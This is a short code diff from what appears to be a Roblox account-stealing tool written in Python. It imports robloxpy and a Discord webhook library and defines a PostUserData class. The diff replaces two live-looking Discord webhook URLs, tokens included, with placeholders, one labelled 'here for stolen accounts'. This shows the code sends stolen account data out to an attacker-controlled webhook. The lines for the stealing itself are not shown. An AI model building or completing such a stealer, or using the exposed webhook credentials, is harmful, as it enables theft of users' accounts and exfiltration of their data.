@@ -6,8 +6,8 @@ import json
 import robloxpy
 from discord_webhook import DiscordWebhook
 
-DiscordWebhookURL = "https://discord.com/api/webhooks/1266591828665438209/PMH5_dW9NQV2wv8PZuypGAppe1LscNSrBUdkmRC5ZSNom9oXygjdpeALB_ViB0l5ezrK"
-DiscordWebhookURL_ERROR = "https://discord.com/api/webhooks/1266600068262137920/OcUCcPjpqHw0SgVzJKihCITqWJF0JcqG-8J9GjYPUJSFu6vazfUit_Nq3DSwnLw3o77E"
+DiscordWebhookURL = "here for stolen accounts"
+DiscordWebhookURL_ERROR = "here error webhooked for handling errors"
 
 class PostUserData:
     
